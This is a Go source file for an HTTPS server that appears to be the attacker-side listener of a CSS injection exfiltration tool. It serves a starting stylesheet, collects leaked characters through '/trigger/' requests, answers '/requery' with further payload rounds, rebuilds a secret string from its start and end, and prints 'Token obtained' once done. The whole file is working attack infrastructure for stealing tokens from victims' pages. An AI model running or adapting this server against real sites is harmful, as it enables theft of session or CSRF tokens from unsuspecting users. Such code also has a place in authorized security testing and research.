package server

import (
	"fmt"
	"net/http"
	"path/filepath"
	"strings"

	"golang.org/x/net/http2"
)

func RunHttpServer(ConfPath string) {

	conf := Parse_conf(ConfPath)

	server := &http.Server{
		Addr: ":" + conf.Port,
	}
	http2.ConfigureServer(server, &http2.Server{})

	fmt.Println("Server started and listen on " + conf.IPAddr + ":" + conf.Port)
	chl := make(chan [2]string)
	http.HandleFunc("/", func(writer http.ResponseWriter, request *http.Request) {
		catch(writer, request, chl, conf)
	})
	server.ListenAndServeTLS(conf.CrtPath, conf.KeyPath)
	// server.ListenAndServe()
}

func catch(writer http.ResponseWriter, request *http.Request, chl chan [2]string, conf Conf) {
	storedPayload := &StoredPayload
	payloadEndCheck := &PayloadEndCheck

	if len(*payloadEndCheck) == 2 && isEnd(*storedPayload, *payloadEndCheck) == true {
		fmt.Println("Token obtained :" + *storedPayload)
		SendRequest(writer, "")
		return
	}

	switch {
	case strings.Contains(request.URL.String(), "/start.css"):
		Loop(writer, [2]string{"", "endcheck"}, conf.DN, conf.Port)
	case strings.Contains(request.URL.String(), "/trigger/"):
		urlExtracted := filepath.Base(request.URL.String())
		payloadEndCheckLen := len(*payloadEndCheck) + 1

		if payloadEndCheckLen <= 2 {
			if len(*payloadEndCheck) <= len(urlExtracted) {
				*payloadEndCheck = urlExtracted
				fmt.Println("End with :" + *payloadEndCheck)
			}
			if len(*payloadEndCheck) == 2 {
				chl <- [2]string{"", "classic"}
			} else {
				chl <- [2]string{*payloadEndCheck, "endcheck"}
			}
		} else {
			if len(*storedPayload) <= len(urlExtracted) && strings.Contains(urlExtracted, *storedPayload) {
				*storedPayload = urlExtracted
			}
			fmt.Println("Start with :" + *storedPayload)
			chl <- [2]string{*storedPayload, "classic"}
		}
		SendRequest(writer, "")
	case strings.Contains(request.URL.String(), "/requery"):
		KnowedPasswd := <-chl
		// time.Sleep(1 * time.Second)
		Loop(writer, KnowedPasswd, conf.DN, conf.Port)
	default:
		fmt.Println(request.URL.String())
		fmt.Println("default")
	}
}

func isEnd(storedPayload string, payloadEndCheck string) bool {
	if strings.HasSuffix(storedPayload, payloadEndCheck) {
		return true
	} else {
		return false
	}
}
